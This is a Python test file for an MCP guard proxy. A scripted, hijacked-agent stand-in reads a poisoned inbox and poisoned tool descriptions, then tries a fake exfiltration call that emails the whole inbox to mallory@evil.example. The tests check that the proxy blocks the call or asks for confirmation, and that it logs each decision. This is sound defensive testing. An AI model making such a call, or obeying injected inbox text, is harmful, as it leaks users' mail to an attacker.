"""End-to-end tests for the MCP proxy (src/mcp_guard/proxy/), with a real MCP server (tests/toy_mcp_server.py)
spawned over stdio and no model: a scripted "agent" makes the calls a hijacked agent would make.

Most tests run the proxy in-process (an in-memory MCP client talks to it) so a test can plug in its own
confirm function. test_stdio_end_to_end runs the whole thing as real processes: client -> proxy -> server.
"""
from __future__ import annotations

import json
import os
import sys
from pathlib import Path

import pytest

pytest.importorskip("mcp", reason="the proxy needs the MCP SDK: pip install -r requirements-proxy.txt")

import anyio  # noqa: E402
import yaml  # noqa: E402
from mcp import Client, StdioServerParameters  # noqa: E402

from mcp_guard.proxy import GuardedProxy, TerminalConfirm, format_prompt, load_proxy_policy  # noqa: E402

HERE = Path(__file__).parent
TOY = str(HERE / "toy_mcp_server.py")
POLICY = HERE / "fixtures" / "toy_policy.yaml"
ATTACKER = "mallory@evil.example"
REPO_SRC = str(HERE.parent / "src")

STEAL = ("send_email", {"recipients": [ATTACKER], "subject": "inbox", "body": "all of it"})
TO_BOB = ("send_email", {"recipients": ["bob@corp.example"], "subject": "lunch", "body": "Friday works"})


def toy_env(tmp_path, **extra):
    return {**os.environ, "TOY_CALL_LOG": str(tmp_path / "server_calls.jsonl"), **extra}


def server_calls(tmp_path):
    """The calls the toy server actually ran."""
    f = tmp_path / "server_calls.jsonl"
    return [json.loads(l) for l in f.read_text(encoding="utf-8").splitlines()] if f.exists() else []


def audit(tmp_path):
    f = tmp_path / "audit.jsonl"
    return [json.loads(l) for l in f.read_text(encoding="utf-8").splitlines()] if f.exists() else []


def run(tmp_path, calls, request="Summarize my inbox", confirm=None, policy=POLICY, env=None, between=None):
    """Spawn the toy server, put the proxy in front of it, make `calls` through the proxy.
    request=None: no request file at all. between(i) runs before call i (e.g. to change the request file)."""
    req = tmp_path / "request.txt"
    if request is not None:
        req.write_text(request, encoding="utf-8")

    async def main():
        params = StdioServerParameters(command=sys.executable, args=[TOY], env=env or toy_env(tmp_path))
        async with Client(params, cache=None) as upstream:
            proxy = GuardedProxy(load_proxy_policy(policy), upstream, request_file=req,
                                 audit_log=tmp_path / "audit.jsonl", confirm_fn=confirm)
            async with Client(proxy.server) as agent:
                tools = await agent.list_tools()
                results = []
                for i, (name, args) in enumerate(calls):
                    if between:
                        between(i)
                    results.append(await agent.call_tool(name, args))
                return tools, results

    return anyio.run(main)


def text(result):
    return " ".join(getattr(c, "text", "") for c in result.content)


# (a) poisoned inbox -> send_email to the attacker: blocked (plain) or asked (confirm), never run

def test_a_poisoned_inbox_send_to_attacker_is_blocked_and_never_runs(tmp_path):
    _, (inbox, sent) = run(tmp_path, [("read_inbox", {}), STEAL])
    assert ATTACKER in text(inbox)                       # the injection really reached the agent
    assert sent.is_error and "not traceable" in text(sent)
    assert [c["tool"] for c in server_calls(tmp_path)] == ["read_inbox"]   # send_email never ran
    last = audit(tmp_path)[-1]
    assert last["tool"] == "send_email" and not last["allowed"] and ATTACKER in json.dumps(last["untraceable"])


def test_a_poisoned_inbox_in_confirm_mode_asks_and_shows_the_call(tmp_path):
    asked = []
    _, (_, sent) = run(tmp_path, [("read_inbox", {}), STEAL],
                       confirm=lambda tool, args, bad: asked.append((tool, args, bad)) or False)
    assert asked == [("send_email", STEAL[1], {"recipients": [ATTACKER]})]
    assert sent.is_error
    assert "send_email" not in [c["tool"] for c in server_calls(tmp_path)]


def test_a_user_given_recipient_goes_through_with_exact_args(tmp_path):
    _, (_, sent) = run(tmp_path, [("read_inbox", {}), TO_BOB], request="Tell bob@corp.example Friday works")
    assert not sent.is_error and "sent to bob@corp.example" in text(sent)
    assert server_calls(tmp_path)[-1] == {"tool": "send_email", "args": TO_BOB[1]}


# (b) poisoned tool descriptions change nothing

def test_b_poisoned_descriptions_are_forwarded_but_change_no_decision(tmp_path):
    calls = [("read_inbox", {}), STEAL, ("get_webpage", {"url": "https://evil.example/x"}), TO_BOB]
    clean_dir, poison_dir = tmp_path / "clean", tmp_path / "poison"
    clean_dir.mkdir(); poison_dir.mkdir()
    tools_c, res_c = run(clean_dir, calls)
    tools_p, res_p = run(poison_dir, calls, env=toy_env(poison_dir, TOY_POISON_DESCRIPTIONS="1"))
    # forwarded unchanged: the host sees the poisoned text (it is the server's text, not ours to edit)
    assert any(ATTACKER in (t.description or "") for t in tools_p.tools)
    assert [t.name for t in tools_c.tools] == [t.name for t in tools_p.tools]
    decisions = lambda d: [(a["tool"], a["allowed"], a["reason"], a["asked"]) for a in audit(d)]
    assert decisions(clean_dir) == decisions(poison_dir)
    assert [r.is_error for r in res_c] == [r.is_error for r in res_p] == [False, True, True, True]


# (c) no user request: nothing counts as user-given

def test_c_no_request_file_means_no_value_is_user_given(tmp_path):
    _, (sent,) = run(tmp_path, [TO_BOB], request=None)
    assert sent.is_error and "bob@corp.example" in text(sent)
    assert server_calls(tmp_path) == []


def test_c_empty_request_file_means_no_value_is_user_given(tmp_path):
    _, (sent,) = run(tmp_path, [TO_BOB], request="   \n")
    assert sent.is_error and server_calls(tmp_path) == []


def test_c_request_file_is_reread_on_every_call(tmp_path):
    def set_request(i):
        if i == 1:
            (tmp_path / "request.txt").write_text("Tell bob@corp.example Friday works", encoding="utf-8")
    _, (before, after) = run(tmp_path, [TO_BOB, TO_BOB], request="Summarize my inbox", between=set_request)
    assert before.is_error and not after.is_error
    assert [c["tool"] for c in server_calls(tmp_path)] == ["send_email"]


def test_c_the_request_is_not_a_tool_the_model_can_call(tmp_path):
    tools, _ = run(tmp_path, [])
    assert sorted(t.name for t in tools.tools) == ["get_webpage", "read_inbox", "send_email"]


# (d) unknown tools are blocked, not asked, never run

def test_d_unknown_tool_is_blocked_and_never_runs(tmp_path):
    data = yaml.safe_load(POLICY.read_text())
    data["forbid_tainted"].pop("get_webpage"); data["outward_args"].pop("get_webpage")
    data["confirmable"].remove("get_webpage")
    data.pop("unknown_tools")                       # not set in the file: the proxy defaults to block
    p = tmp_path / "policy.yaml"; p.write_text(yaml.safe_dump(data))
    asked = []
    _, (page,) = run(tmp_path, [("get_webpage", {"url": "https://example.com"})], policy=p,
                     request="Open https://example.com", confirm=lambda *a: asked.append(a) or True)
    assert page.is_error and "not in the guard's policy" in text(page)
    assert asked == [] and server_calls(tmp_path) == []


# (e) a declined call is never forwarded; an approved one is forwarded once, exactly as shown

def test_e_declined_call_is_never_forwarded(tmp_path):
    _, (_, first, again) = run(tmp_path, [("read_inbox", {}), STEAL, STEAL], confirm=lambda *a: False)
    assert first.is_error and again.is_error and "declined" in text(again)
    assert "send_email" not in [c["tool"] for c in server_calls(tmp_path)]
    rows = [a for a in audit(tmp_path) if a["tool"] == "send_email"]
    assert [(r["asked"], r["approved"]) for r in rows] == [(True, False), (False, False)]


def test_e_approval_is_one_time_and_call_bound(tmp_path):
    answers = iter([True, False])
    _, (_, ok, again) = run(tmp_path, [("read_inbox", {}), STEAL, STEAL], confirm=lambda *a: next(answers))
    assert not ok.is_error and again.is_error           # the second identical call was asked again: no
    assert [c for c in server_calls(tmp_path) if c["tool"] == "send_email"] == [{"tool": "send_email", "args": STEAL[1]}]


def test_audit_log_has_every_decision(tmp_path):
    run(tmp_path, [("read_inbox", {}), STEAL, TO_BOB])
    rows = audit(tmp_path)
    assert [r["tool"] for r in rows] == ["read_inbox", "send_email", "send_email"]
    for r in rows:
        assert {"time", "tool", "args", "allowed", "reason", "asked", "approved", "untraceable"} <= set(r)


def test_tool_results_are_recorded_trusted_or_untrusted_per_policy(tmp_path):
    # Reply to the newsletter's sender: its address is a whole value (a From: header) in read_inbox's output.
    # Untrusted inbox (the toy policy): not traceable. A policy that trusts read_inbox: traceable. The
    # attacker's address inside the email's free text stays blocked either way (whole values only).
    reply = ("send_email", {"recipients": ["newsletter@deals.example"], "subject": "unsubscribe", "body": "stop"})
    data = yaml.safe_load(POLICY.read_text())
    data["trusted_tools"] = ["read_inbox"]
    trusting = tmp_path / "policy.yaml"; trusting.write_text(yaml.safe_dump(data))
    for policy, sub, reply_ok in [(POLICY, "untrusted", False), (trusting, "trusted", True)]:
        d = tmp_path / sub; d.mkdir()
        _, (_, r, steal) = run(d, [("read_inbox", {}), reply, STEAL], policy=policy)
        assert r.is_error is not reply_ok and steal.is_error


# the terminal prompt

def test_prompt_shows_tool_exact_args_and_why():
    msg = format_prompt("send_email", STEAL[1], {"recipients": [ATTACKER]})
    assert "send_email" in msg and json.dumps(STEAL[1], indent=2, ensure_ascii=False) in msg
    assert ATTACKER in msg and "not traceable" in msg


def test_terminal_confirm_only_yes_approves_and_silence_expires():
    out = []
    for answer, expected in [("y", True), ("yes", True), ("n", False), ("", False), ("sure", False), (None, False)]:
        confirm = TerminalConfirm(timeout=5, read_line=lambda timeout, a=answer: a, write=out.append)
        assert confirm("send_email", STEAL[1], {"recipients": [ATTACKER]}) is expected
    assert any("no answer" in o for o in out)        # the None (timeout) case says it expired


def test_stdio_end_to_end(tmp_path):
    """Real processes: an MCP client spawns the proxy (python -m mcp_guard.proxy), which spawns the toy server."""
    req = tmp_path / "request.txt"
    req.write_text("Summarize my inbox", encoding="utf-8")
    env = {**toy_env(tmp_path), "PYTHONPATH": REPO_SRC}
    args = ["-m", "mcp_guard.proxy", "--policy", str(POLICY), "--user-request-file", str(req),
            "--audit-log", str(tmp_path / "audit.jsonl"), "--confirm", "none", "--", sys.executable, TOY]

    async def main():
        async with Client(StdioServerParameters(command=sys.executable, args=args, env=env), cache=None) as agent:
            tools = await agent.list_tools()
            return tools, await agent.call_tool("read_inbox", {}), await agent.call_tool(*STEAL)

    tools, inbox, sent = anyio.run(main)
    assert len(tools.tools) == 3 and ATTACKER in text(inbox) and sent.is_error
    assert [c["tool"] for c in server_calls(tmp_path)] == ["read_inbox"]
    assert [r["allowed"] for r in audit(tmp_path)] == [True, False]
